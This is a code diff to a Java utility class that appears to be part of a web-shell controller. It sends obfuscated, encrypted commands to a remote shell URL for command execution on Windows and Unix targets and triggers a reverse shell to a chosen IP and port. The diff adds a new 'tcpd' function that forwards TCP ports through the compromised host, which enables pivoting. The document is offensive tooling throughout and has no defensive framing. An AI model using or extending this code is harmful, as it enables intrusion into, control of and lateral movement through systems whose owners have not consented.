@@ -14,6 +14,8 @@ import okhttp3.Response;
 public class Util {
 	private static OkHttpClient okHttpClient
 	=new OkHttpClient.Builder().build();
+	
+
 	public static String Readtext(String name) {
 		try {
 			BufferedReader bufferedReader = new BufferedReader(new FileReader(new File(name)));
@@ -37,10 +39,12 @@ public class Util {
 		}
 		switch (pfm) {
 		case "win":
+			System.out.println(Util.EnChar(new String(Main.encoder.encode(Main.cmd.replace("%cmd%", "cmd /c "+cmd).getBytes())), Main.key, Main.words));
 			String res=Util.GetResponseString(Main.pass, Main.url, Util.EnChar(new String(Main.encoder.encode(Main.cmd.replace("%cmd%", "cmd /c "+cmd).getBytes())), Main.key, Main.words), Main.key, Main.words);
 			return res;
 		case "unix":
-			String res2=Util.GetResponseString(Main.pass, Main.url, Util.EnChar(new String(Main.encoder.encode(Main.cmd.replace("%cmd%", "sh -c "+cmd).getBytes())), Main.key, Main.words), Main.key, Main.words);
+			System.out.println();
+			String res2=Util.GetResponseString(Main.pass, Main.url, Util.EnChar(new String(Main.encoder.encode(Main.cmd.replace("%cmd%", cmd).getBytes())), Main.key, Main.words), Main.key, Main.words);
 			return res2;
 		default:
 			return "";
@@ -56,8 +60,27 @@ public class Util {
 			String res=Util.GetResponseString(Main.pass, Main.url, Util.EnChar(new String(Main.encoder.encode(Main.shell.replace("%cmd1%", exec).replace("%cmd2%", ip).replace("%cmd3%", port).getBytes())), Main.key, Main.words), Main.key, Main.words);
 			return res;
 		case "unix":
-			exec="/bin/sh";
+			exec="/bin/bash";
 			String res2=Util.GetResponseString(Main.pass, Main.url, Util.EnChar(new String(Main.encoder.encode(Main.shell.replace("%cmd1%", exec).replace("%cmd2%", ip).replace("%cmd3%", port).getBytes())), Main.key, Main.words), Main.key, Main.words);
+			return res2;
+		default:
+			return "fail";
+		}
+	}
+	
+	
+	public static String tcpd(String pfm,List<String> cmdlist) {
+		String rip=cmdlist.get(1);
+		String rport=cmdlist.get(2);
+		String toip=cmdlist.get(3);
+		String toport=cmdlist.get(4);
+		switch (pfm) {
+		case "win":
+			String res=Util.GetResponseString(Main.pass, Main.url, Util.EnChar(new String(Main.encoder.encode(Main.tcpd.replace("%rip%", rip).replace("%rport%", rport).replace("%toip%", toip).replace("%toport%", toport).getBytes())), Main.key, Main.words), Main.key, Main.words);
+			return res;
+		case "unix":
+			System.err.println(Util.EnChar(new String(Main.encoder.encode(Main.tcpd.replace("%rip%", rip).replace("%rport%", rport).replace("%toip%", toip).replace("%toport%", toport).getBytes())), Main.key, Main.words));
+			String res2=Util.GetResponseString(Main.pass, Main.url, Util.EnChar(new String(Main.encoder.encode(Main.tcpd.replace("%rip%", rip).replace("%rport%", rport).replace("%toip%", toip).replace("%toport%", toport).getBytes())), Main.key, Main.words), Main.key, Main.words);
 			return res2;
 		default:
 			return "fail";
